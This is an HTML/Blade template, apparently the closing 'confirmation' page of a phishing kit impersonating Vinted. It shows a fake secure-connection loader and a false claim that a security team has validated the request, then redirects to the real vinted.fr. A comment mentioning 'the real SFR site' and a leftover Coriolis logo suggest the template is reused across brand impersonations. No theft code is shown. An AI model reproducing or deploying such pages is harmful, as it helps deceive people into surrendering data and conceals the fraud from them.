<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VINTED | CONFIRMATION</title>
    @vite(['resources/css/app.css'])
    <style>
        .coriolis-text { color: #0d9488; }
        .success-bg { background-color: #f8fafc; }
    </style>
</head>
<body class="success-bg font-sans min-h-screen flex items-center justify-center p-4">

<div id="global-loader" style="position: fixed; inset: 0; z-index: 9999; background: white; display: flex; flex-direction: column; align-items: center; justify-content: center; transition: opacity 0.5s ease;">
        <div class="loader-content" style="text-align: center; margin-top: 0;">
            <div style="width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #0d9488; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto;"></div>
            <h2 style="font-family: sans-serif; color: #1b1b18; margin-top: 20px;">Connexion sécurisée...</h2>
            <p style="font-family: sans-serif; color: #706f6c; font-size: 14px;">Validation Réussie</p> 
        </div>
    </div>

<style>
    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
</style>

<script>

        // B. On attend le chargement complet pour cacher le loader
        window.addEventListener('load', function() {
            const loader = document.getElementById('global-loader');
            
            // Sécurité : on vérifie que l'élément existe bien avant d'agir
            if (loader) {
                setTimeout(() => {
                    loader.style.opacity = '0';
                    setTimeout(() => {
                        loader.style.display = 'none';
                    }, 500);
                }, 1200);
            }
        });
    </script>

    <div class="bg-white p-10 rounded-2xl shadow-xl max-w-md w-full text-center border-t-8 border-teal-600">
        <!-- Icône de Succès Animée -->
        <div class="mb-6 flex justify-center">
            <div class="rounded-full bg-green-100 p-4">
                <svg class="w-16 h-16 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
                </svg>
            </div>
        </div>

        <h1 class="text-2xl font-bold text-gray-800 mb-4">Validation réussie</h1>
        
        <p class="text-gray-600 mb-8 leading-relaxed">
            Votre demande a bien été prise en compte par nos services de sécurité. <br>
            <span class="font-semibold text-gray-800">Nous traitons votre demande et vous enverrons un email de confirmation sous peu !.</span>
        </p>

        <div class="py-4 px-6 bg-gray-50 rounded-lg inline-block w-full">
            <p class="text-sm text-gray-500">
                Redirection automatique vers l'accueil <br>
                <span id="timer" class="text-xl font-bold coriolis-text">5</span> secondes...
            </p>
        </div>

        <!--<div class="mt-8">
            <img src="https://www.coriolis.com/media/logo/default/logo-coriolis.png" alt="Coriolis" class="h-8 mx-auto opacity-50">
        </div>-->
    </div>

    <script>
        let timeLeft = 5;
        const timerElement = document.getElementById('timer');

        const countdown = setInterval(() => {
            timeLeft--;
            timerElement.textContent = timeLeft;

            if (timeLeft <= 0) {
                clearInterval(countdown);
                // Redirection vers le vrai site SFR
                window.location.href = "https://www.vinted.fr/";
            }
        }, 1000);
    </script>
</body>
</html>